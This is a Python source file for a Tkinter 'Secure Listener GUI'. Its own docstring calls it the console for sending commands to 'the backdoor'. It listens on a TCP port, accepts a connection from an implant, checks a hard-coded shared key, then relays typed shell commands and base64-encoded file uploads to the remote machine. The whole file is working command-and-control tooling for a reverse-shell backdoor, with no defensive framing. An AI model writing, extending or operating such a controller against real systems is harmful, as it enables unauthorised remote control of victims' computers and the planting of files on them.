import socket
import threading
import json
import base64
import tkinter as tk
from tkinter import scrolledtext, simpledialog

class SecureListenerGUI:
    def __init__(self, master):
        self.master = master
        self.master.title("Secure Listener GUI")
        self.master.geometry("800x500")

        self.text_area = scrolledtext.ScrolledText(master, wrap=tk.WORD, width=90, height=25)
        self.text_area.pack(pady=5)
        self.text_area.insert(tk.END, "[+] GUI Initialized.\n")

        self.entry = tk.Entry(master, width=80)
        self.entry.pack(pady=5)
        self.entry.bind("<Return>", self.send_command)

        self.send_button = tk.Button(master, text="Send Command", command=self.send_command)
        self.send_button.pack()

        self.listener_thread = threading.Thread(target=self.start_listener, daemon=True)
        self.listener_thread.start()

    def log(self, message):
        """Append log messages to the GUI"""
        self.text_area.insert(tk.END, message + "\n")
        self.text_area.see(tk.END)

    def start_listener(self):
        """Start the listener in a separate thread to avoid GUI freezing"""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind(("192.168.1.65", 5555))  # Your Windows IP
        self.server_socket.listen(5)

        self.log("[+] Waiting for connections...")
        self.connection, self.address = self.server_socket.accept()
        self.log(f"[+] Connection established from {self.address}")

        # Authenticate
        self.connection.send(b"AUTH_REQ")
        auth_response = self.connection.recv(1024).decode()
        if auth_response == "SECRET_KEY":
            self.log("[+] Authentication successful.")
        else:
            self.log("[-] Authentication failed.")
            self.connection.close()
            return

    def reliable_send(self, data):
        """Send JSON encoded data"""
        try:
            json_data = json.dumps(data)
            self.connection.sendall(json_data.encode())
        except Exception as e:
            self.log(f"[-] Error sending data: {e}")

    def reliable_receive(self):
        """Receive JSON encoded data"""
        json_data = b""
        while True:
            try:
                chunk = self.connection.recv(1024)
                if not chunk:
                    raise ConnectionError("[-] Connection closed by the server.")
                json_data += chunk
                return json.loads(json_data.decode())
            except ValueError:
                continue
            except ConnectionError as e:
                self.log(f"[!] {e}")
                self.connection.close()
                break

    def send_command(self, event=None):
        """Send commands to the backdoor"""
        command = self.entry.get()
        if not command:
            return

        self.log(f">> {command}")
        self.entry.delete(0, tk.END)

        if command.startswith("upload "):
            try:
                file_path = command.split(" ", 1)[1]
                with open(file_path, "rb") as file:
                    encoded_data = base64.b64encode(file.read()).decode()
                self.reliable_send(["upload", file_path, encoded_data])
                self.log(f"[+] {file_path} uploaded successfully.")
            except Exception as e:
                self.log(f"[-] File upload failed: {e}")
        else:
            self.reliable_send([command])
            response = self.reliable_receive()
            self.log(response)

if __name__ == "__main__":
    root = tk.Tk()
    app = SecureListenerGUI(root)
    root.mainloop()
